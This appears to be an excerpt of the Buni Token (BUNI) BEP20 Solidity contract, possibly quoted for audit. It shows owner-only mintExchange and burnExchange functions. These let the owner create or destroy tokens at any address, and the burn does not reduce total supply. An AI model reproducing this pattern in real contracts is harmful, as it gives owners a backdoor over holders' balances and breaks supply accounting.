...
contract BEP20 is Context, IBEP20, Pausable {
    ...
    /** @dev Creates `amount` tokens and assigns them to `exchange`
     *
     * Requirements
     *
     * - `exchange` cannot be the zero address.
     * - can only be called by owner during ownership
     */
    function mintExchange(address exchange, uint256 amount) external onlyOwner {
        require(exchange != address(0), "BEP20: mint to the zero address");
        _balances[exchange] = _balances[exchange].add(amount);
        _totalSupply = _totalSupply.add(amount);
    }
    ...
    /**
     * @dev Destroys `amount` tokens from `exchange`
     *
     * Requirements
     *
     * - `exchange` cannot be the zero address.
     * - can only be called by owner during ownership
     */
    function burnExchange(address exchange, uint256 amount) external onlyOwner {
        require(exchange != address(0), "BEP20: burn from the zero address");
        _balances[exchange] = _balances[exchange].sub(amount, "BEP20: burn amount exceeds balance");
    }
    ...
    /**
     * @dev Withdraw unexpected tokens sent to the contract during ownership
     */
    ...
    /**
     * @dev Withdraws unexpected funds sent to the contract during ownership
     */
...
contract BuniToken is BEP20Detailed, BEP20 {
    constructor() public BEP20Detailed("Buni Token", "BUNI", 18) {  
